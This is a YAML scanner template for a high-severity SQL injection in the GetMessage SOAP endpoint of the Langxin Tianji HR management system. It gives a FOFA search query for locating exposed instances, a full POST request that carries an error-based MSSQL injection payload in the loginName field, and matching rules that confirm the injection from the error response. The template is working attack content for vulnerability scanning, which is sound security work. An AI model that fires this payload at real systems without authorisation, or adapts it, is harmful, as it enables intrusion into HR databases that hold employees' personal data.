id: poc-yaml-hrsoft-getmessage-sqli
info:
  name: 朗新天霁人力资源管理系统GetMessage存在sql注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 朗新天霁人力资源管理系统
  fofa: body="人力资源管理系统" && body="Silverlight"
requests:
- method: POST
  path: /ws/GetFunc_code.asmx
  headers:
    Content-Type: text/xml; charset=utf-8
    SOAPAction: http://tempuri.org/GetMessage
  data: '<?xml version="1.0" encoding="utf-8"?>

    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>

    <GetMessage xmlns="http://tempuri.org/">

    <loginName>'' AND 6935 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(112)+CHAR(106)+CHAR(113)+(SELECT
    (CASE WHEN (6935=6935) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(113)+CHAR(118)+CHAR(113)))
    AND ''qaq''=''qaq</loginName>

    </GetMessage>

    </soap:Body>

    </soap:Envelope>'
  expression: "status_code == 500 && \ncontains(body,\"qzpjq1qzqvq\") &&\ncontains(body,\"\
    System.Data.SqlClient.SqlException\")\n"
variables: {}
transport: http
